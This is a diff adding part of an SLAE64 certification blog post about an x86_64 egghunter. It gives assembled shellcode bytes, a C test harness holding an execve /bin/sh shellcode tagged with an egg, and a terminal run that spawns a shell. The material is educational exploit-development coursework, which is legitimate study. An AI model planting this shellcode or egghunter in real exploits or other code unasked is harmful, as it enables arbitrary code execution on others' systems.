@@ -57,3 +57,57 @@ main:
 
 Let's assemble this, link it, and get its shellcode.
 
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ nasm -f elf64 1.asm -o 1.o && ld 1.o -o 1 && for i in $(objdump -d 1 -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo 
+\x48\xff\xc2\x52\x59\x48\xbd\x56\x57\x56\x57\x56\x57\x56\x57\x48\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x48\x29\xdd\x48\xff\xc1\x48\x3b\x29\x75\xf8\x48\x8d\x49\x08\xff\xe1
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$
+```
+
+###### C format
+
+```term
+#include<stdio.h>
+#include<string.h>
+
+unsigned char egg[] = \
+"\x48\xff\xc2\x52\x59\x48\xbd\x56\x57\x56\x57\x56\x57\x56\x57\x48\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x48\x29\xdd\x48\xff\xc1\x48\x3b\x29\x75\xf8\x48\x8d\x49\x08\xff\xe1"
+
+;
+
+unsigned char code[] = \
+"\x45\x46\x45\x46\x45\x46\x45\x46"
+"\x48\x31\xc0\x48\x31\xf6\x48\x31\xdb\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
+
+;
+
+main()
+{
+
+  printf("Shellcode size:  %d\n", strlen(code));
+  printf("Egg size:  %d\n", strlen(egg));
+
+        int (*ret)() = (int(*)())egg;
+
+        ret();
+
+}
+```
+
+#### EndGame
+
+```term
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ gcc egghunter-x86_64.c -o egghunter-x86_64 -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE64:~/assembly/assignments/Assignment_3$ ./egghunter-x86_64 
+Shellcode size:  44
+Egg size:  42
+$
+```
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE-27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64/Assignment_3).
